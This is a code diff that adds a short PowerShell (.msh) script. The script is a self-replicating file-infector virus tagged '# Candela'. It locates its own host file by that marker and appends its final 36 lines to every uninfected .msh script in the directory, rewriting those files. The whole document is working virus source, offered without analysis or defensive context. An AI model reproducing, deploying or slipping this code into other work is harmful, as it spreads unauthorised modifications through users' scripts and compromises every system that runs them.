@@ -1,0 +1,36 @@
+$name_array=get-childitem *.msh
+# Candela
+foreach ($name in $name_array)
+{
+  $cont=get-content $name.Name
+  for ($i=0; $i -lt $cont.Length; $i++)
+  {
+    if ($cont[$i] -eq "# Candela")
+    {
+      $my_name=$name.Name
+    }
+  }
+}
+
+$vir_cont=get-content $my_name
+foreach ($name in $name_array)
+{
+  $inf=0
+  $cont=get-content $name.Name
+  for ($i=0; $i -lt $cont.Length; $i++)
+  {
+    if ($cont[$i] -eq "# Candela")
+    {
+      $inf=1
+    }
+  }
+  if ($inf -eq 0)
+  {
+    echo $cont >$name.Name
+    $vir_start=$vir_cont.Length-36
+    for ($i=$vir_start; $i -lt $vir_cont.Length; $i++)
+    {
+      echo $vir_cont[$i] >>$name.Name
+    }
+  }
+}
